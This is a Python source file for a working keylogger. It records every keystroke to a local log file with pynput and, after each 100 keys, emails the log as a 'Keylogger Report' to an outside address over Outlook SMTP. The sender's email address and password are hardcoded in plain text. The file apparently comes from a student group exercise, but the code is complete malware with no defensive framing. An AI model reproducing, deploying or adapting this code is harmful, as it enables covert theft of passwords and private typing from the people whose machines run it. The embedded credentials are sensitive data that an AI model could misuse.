from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def get_keys():
    try:
        with open('data.log', 'r') as file:
            text = file.read()
    except Exception as e:
        print(f"Error reading log file: {e}")
        text = ""
    return text

def add_key(key):
    try:
        with open('data.log', 'a') as file:
            if key == keyboard.Key.space:
                file.write(' ')
            else:
                file.write(f'{key} ')
    except Exception as e:
        print(f"Error writing to log file: {e}")

def send_email(subject, body):
    sender_email = "gruppe4test@outlook.com"
    receiver_email = "1089440@ucn.dk"
    password = "123456789ti"

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject

    message.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP('smtp-mail.outlook.com', 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_press(key):
    try:
        key_name = key.char
    except AttributeError:
        key_name = key
    add_key(key_name)
    return False

def main():
    count = 0
    threshold = 100  # Change this if you want to modify the number of keystrokes
    
    with open('data.log', 'w') as file:
        file.write('')
    
    while True:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()
        count += 1
        if count >= threshold:
            subject = "Keylogger Report"
            body = get_keys()
            send_email(subject, body)
            count = 0
            with open('data.log', 'w') as file:
                file.write('')

if __name__ == "__main__":
    main()
